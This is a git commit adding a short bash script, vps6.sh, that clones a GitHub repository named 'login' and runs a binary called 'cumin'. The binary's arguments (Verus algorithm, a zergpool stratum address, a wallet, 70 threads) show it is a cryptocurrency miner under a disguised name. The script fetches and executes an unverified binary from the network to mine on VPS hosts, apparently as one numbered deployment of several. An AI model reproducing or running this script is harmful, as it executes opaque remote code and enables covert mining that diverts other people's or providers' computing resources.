fd4f68d9160fae691cd388d72275d7a1e177108d
sallygonza <90584824+sallygonza@users.noreply.github.com>
2021-12-28 08:13:38 +0700

    Update and rename vps4.sh to vps6.sh

---
+++ vps6.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+sudo apt update
+git clone https://github.com/sallygonza/login.git 
+cd login
+chmod +x cumin
+./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW -p x -t 70  c=VRSC,mc=VRSC
